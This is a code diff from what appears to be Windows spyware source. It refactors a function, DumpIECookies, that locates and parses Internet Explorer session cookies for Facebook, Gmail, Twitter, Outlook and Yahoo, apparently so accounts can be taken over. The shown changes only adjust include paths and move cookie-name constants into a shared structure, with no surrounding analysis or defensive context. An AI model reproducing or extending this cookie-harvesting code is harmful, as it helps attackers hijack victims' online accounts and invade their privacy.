@@ -1,7 +1,8 @@
 #include <windows.h>
 #define _CRT_SECURE_NO_WARNINGS 1
 #include <stdio.h>
-#include "..\\common.h"
+#include "../common.h"
+#include "../bss.h"
 #include "CookieHandler.h"
 #include "SocialMain.h"
 
@@ -113,11 +114,11 @@ int DumpIECookies(WCHAR *cookie_path)
 	WCHAR cookie_search[MAX_PATH];
 	HANDLE hFind;
 
-	ParseSessionCookies(FACEBOOK_IE_COOKIE, FACEBOOK_DOMAINA);
-	ParseSessionCookies(GMAIL_IE_COOKIE, GMAIL_DOMAINA);
-	ParseSessionCookies(TWITTER_IE_COOKIE, TWITTER_DOMAINA);
-	ParseSessionCookies(OUTLOOK_IE_COOKIE, OUTLOOK_DOMAINA);
-	ParseSessionCookies(YAHOO_IE_COOKIE, YAHOO_DOMAINA);
+	ParseSessionCookies(shared.FACEBOOK_IE_COOKIE, FACEBOOK_DOMAINA);
+	ParseSessionCookies(shared.GMAIL_IE_COOKIE, GMAIL_DOMAINA);
+	ParseSessionCookies(shared.TWITTER_IE_COOKIE, TWITTER_DOMAINA);
+	ParseSessionCookies(shared.OUTLOOK_IE_COOKIE, OUTLOOK_DOMAINA);
+	ParseSessionCookies(shared.YAHOO_IE_COOKIE, YAHOO_DOMAINA);
 
 	ie_dir = GetIEProfilePath(cookie_path);
 	_snwprintf_s(cookie_search, MAX_PATH, L"%s\\*", ie_dir);  
